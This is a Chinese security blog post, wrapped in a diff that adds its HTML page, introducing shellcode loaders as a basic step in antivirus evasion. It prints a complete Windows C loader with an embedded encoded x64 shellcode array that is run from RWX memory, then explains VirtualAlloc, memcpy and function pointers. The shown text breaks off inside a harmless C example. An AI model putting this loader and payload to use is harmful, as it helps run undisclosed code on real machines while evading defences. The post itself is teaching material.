@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>免杀基础之认识shellcode加载器 | Polo&#39;s Blog</title>
+  <meta name="description" content="认识shellcode加载器下面是一个最简单的shellcode加载器，目的是将shellcode加载到内存中并执行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define _CRT_SECURE_NO_DEPRECATE#include &quot;Wind">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀基础之认识shellcode加载器">
+<meta property="og:url" content="https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="认识shellcode加载器下面是一个最简单的shellcode加载器，目的是将shellcode加载到内存中并执行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define _CRT_SECURE_NO_DEPRECATE#include &quot;Wind">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-15T09:37:24.000Z">
+<meta property="article:modified_time" content="2022-01-15T09:37:29.324Z">
+<meta property="article:author" content="Polo">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/polosec" target="_blank">
+          <img class="img-circle img-rotate" src="http://cdn.polowong.top/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Polo</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer&amp;Cybersec Researcher</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>null</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wp/">wp</a><span class="category-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0307xctf/" rel="tag">0307xctf</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%96%E8%AF%81/" rel="tag">取证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" rel="tag">红队技能</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/0307xctf/" style="font-size: 13.33px;">0307xctf</a> <a href="/tags/awd/" style="font-size: 13px;">awd</a> <a href="/tags/buu/" style="font-size: 13.5px;">buu</a> <a href="/tags/buuoj/" style="font-size: 13.5px;">buuoj</a> <a href="/tags/c/" style="font-size: 13px;">c++</a> <a href="/tags/ctf/" style="font-size: 13px;">ctf</a> <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 13px;">c语言</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/linux/" style="font-size: 13.17px;">linux</a> <a href="/tags/misc/" style="font-size: 13.83px;">misc</a> <a href="/tags/mysql/" style="font-size: 13.17px;">mysql</a> <a href="/tags/php/" style="font-size: 13.67px;">php</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 13px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13.17px;">内网渗透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13px;">反序列化</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size: 13px;">取证</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 13.17px;">密码学</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 13px;">杂项</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 13px;">流量分析</a> <a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" style="font-size: 13px;">红队技能</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 13.17px;">网络</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">16</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" class="title">免杀基础之认识shellcode加载器</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-01-15T09:37:24.000Z" itemprop="datePublished">2022-01-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/" class="title">免杀基础之远程线程注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-01-15T09:36:51.000Z" itemprop="datePublished">2022-01-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/01/12/%E5%87%A0%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99-%E9%87%8D%E4%BF%9D%E5%80%BC%E5%AE%88%E5%BF%85%E5%A4%87%EF%BC%89/" class="title">几款优秀的在线样本分析网站(重保值守必备）</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-01-12T09:24:00.000Z" itemprop="datePublished">2022-01-12</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/01/10/Venom%E2%80%94%E2%80%94%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9F%BA%E4%BA%8Ego%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/" class="title">Venom——一款优秀的基于go语言实现的内网穿透工具</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-01-10T14:44:36.000Z" itemprop="datePublished">2022-01-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/01/09/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-smb%E6%89%AB%E6%8F%8F%E5%A4%87%E5%BF%98/" class="title">redis主从复制/smb扫描备忘</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-01-09T09:47:11.000Z" itemprop="datePublished">2022-01-09</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-免杀基础之认识shellcode加载器" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      免杀基础之认识shellcode加载器
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" class="article-date">
+	  <time datetime="2022-01-15T09:37:24.000Z" itemprop="datePublished">2022-01-15</time>
+	</a>
+</span>
+        
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.4k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 6(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="认识shellcode加载器"><a href="#认识shellcode加载器" class="headerlink" title="认识shellcode加载器"></a>认识shellcode加载器</h1><p>下面是一个最简单的shellcode加载器，目的是将shellcode加载到内存中并执行。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line">        <span class="string">&quot;\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\xff\xff\x48\xbb\xa2\xd8\x0e\xfe\xd3\xcd\x9c\xae\x48\x31\x58&quot;</span></span><br><span class="line">        <span class="string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5e\x90\x8d\x1a\x23\x25&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5c\xae\xa2\xd8\x4f\xaf\x92\x9d\xce\xff\xf4\x90\x3f\x2c\xb6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x17\xfc\xc2\x90\x85\xac\xcb\x85\x17\xfc\x82\x90\x85\x8c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x83\x85\x93\x19\xe8\x92\x43\xcf\x1a\x85\xad\x6e\x0e\xe4\x6f&quot;</span></span><br><span class="line">        <span class="string">&quot;\x82\xd1\xe1\xbc\xef\x63\x11\x03\xbf\xd2\x0c\x7e\x43\xf0\x99&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5f\xb6\x58\x9f\xbc\x25\xe0\xe4\x46\xff\x03\x46\x1c\x26\xa2&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd8\x0e\xb6\x56\x0d\xe8\xc9\xea\xd9\xde\xae\x58\x85\x84\xea&quot;</span></span><br><span class="line">        <span class="string">&quot;\x29\x98\x2e\xb7\xd2\x1d\x7f\xf8\xea\x27\xc7\xbf\x58\xf9\x14&quot;</span></span><br><span class="line">        <span class="string">&quot;\xe6\xa3\x0e\x43\xcf\x1a\x85\xad\x6e\x0e\x99\xcf\x37\xde\x8c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x9d\x6f\x9a\x38\x7b\x0f\x9f\xce\xd0\x8a\xaa\x9d\x37\x2f\xa6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x15\xc4\xea\x29\x98\x2a\xb7\xd2\x1d\xfa\xef\x29\xd4\x46\xba&quot;</span></span><br><span class="line">        <span class="string">&quot;\x58\x8d\x80\xe7\xa3\x08\x4f\x75\xd7\x45\xd4\xaf\x72\x99\x56&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x8b\x93\xc5\xf4\xe3\x80\x4f\xa7\x92\x97\xd4\x2d\x4e\xf8&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4f\xac\x2c\x2d\xc4\xef\xfb\x82\x46\x75\xc1\x24\xcb\x51\x5d&quot;</span></span><br><span class="line">        <span class="string">&quot;\x27\x53\xb7\x6d\xba\xef\x9c\xfd\xeb\x3c\xfe\xd3\x8c\xca\xe7&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x3e\x46\x7f\x3f\x6d\x9d\xae\xa2\x91\x87\x1b\x9a\x71\x9e&quot;</span></span><br><span class="line">        <span class="string">&quot;\xae\xa3\x63\xce\x56\x7d\xce\xdd\xfa\xeb\x51\xea\xb2\x5a\x3c&quot;</span></span><br><span class="line">        <span class="string">&quot;\xdd\x14\xee\xaf\x28\xf9\x2c\x18\xd0\x27\x48\xb0\x0f\xff\xd3&quot;</span></span><br><span class="line">        <span class="string">&quot;\xcd\xc5\xef\x18\xf1\x8e\x95\xd3\x32\x49\xfe\xf2\x95\x3f\x37&quot;</span></span><br><span class="line">        <span class="string">&quot;\x9e\xfc\x5c\xe6\x5d\x18\x46\x77\x11\x85\x63\x6e\xea\x51\xcf&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x69\x27\x93\x71\x42\x27\xdb\xb6\x5a\x0a\xf6\xbe\xe3\x80&quot;</span></span><br><span class="line">        <span class="string">&quot;\x42\x77\x31\x85\x15\x57\xe3\x62\x97\x5b\xa7\xac\x63\x7b\xea&quot;</span></span><br><span class="line">        <span class="string">&quot;\x59\xca\xbe\xd1\xcd\x9c\xe7\x1a\xbb\x63\x9a\xd3\xcd\x9c\xae&quot;</span></span><br><span class="line">        <span class="string">&quot;\xa2\x99\x5e\xbf\x83\x85\x15\x4c\xf5\x8f\x59\xb3\xe2\x0d\xf6&quot;</span></span><br><span class="line">        <span class="string">&quot;\xa3\xfb\x99\x5e\x1c\x2f\xab\x5b\xea\x86\x8c\x0f\xff\x9b\x40&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd8\x8a\xba\x1e\x0e\x96\x9b\x44\x7a\xf8\xf2\x99\x5e\xbf\x83&quot;</span></span><br><span class="line">        <span class="string">&quot;\x8c\xcc\xe7\x5d\x18\x4f\xae\x9a\x32\x54\xe3\x2b\x19\x42\x77&quot;</span></span><br><span class="line">        <span class="string">&quot;\x12\x8c\x26\xd7\x6e\xe7\x88\x01\x06\x85\xad\x7c\xea\x27\xc4&quot;</span></span><br><span class="line">        <span class="string">&quot;\x75\xdd\x8c\x26\xa6\x25\xc5\x6e\x01\x06\x76\x6c\x1b\x00\x8e&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4f\x44\x75\x58\x21\x33\x5d\x0d\x46\x7d\x17\xe5\xa0\xa8\xde&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd2\x8e\x05\x33\xb8\x99\x15\xe5\xcb\x7c\x91\xb9\xcd\xc5\xef&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x02\xf1\x2b\xd3\xcd\x9c\xae&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="keyword">sizeof</span> buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buf, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">    ((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，VirtualAlloc()的作用是在虚拟内存空间中申请一块区域</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   VirtualAlloc(</span></span><br><span class="line"><span class="comment">       NULL, // 基址</span></span><br><span class="line"><span class="comment">       800,  // 大小</span></span><br><span class="line"><span class="comment">       MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">       PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">       );</span></span><br><span class="line"><span class="comment">   */</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>void *memcpy(void *str1, const void *str2, size_t n)</strong> 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong>,在上述实例中是将buf复制到exec中，大小为sizeof(buf)</p>
+<p>下面这句话比较关键，</p>
+<p>((void(*)())exec)()</p>
+<p>理解这句话首先要回顾c语言相关知识，*p代表一个指针，指针指向某个函数的地址，而*p()则代表了调用p所指向的函数。</p>
+<p>标准的调用方法为(*p)(),简写为<strong>p()</strong></p>
+<p>示例如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>, <span class="keyword">int</span>);  <span class="comment">//定义一个函数指针</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c,d;</span><br><span class="line">    p = Max;  <span class="comment">//把函数Max赋给指针变量p, 使p指向Max函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please enter a and b:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">p</span>(a, b);    <span class="comment">// 通过函数指针调用Max函数</span></span><br><span class="line">    d = (*p)(a, b); <span class="comment">// 这样调用也行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\nb = %d\nmax = %d,%d\n&quot;</span>, a, b, c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span>  <span class="comment">//定义Max函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span 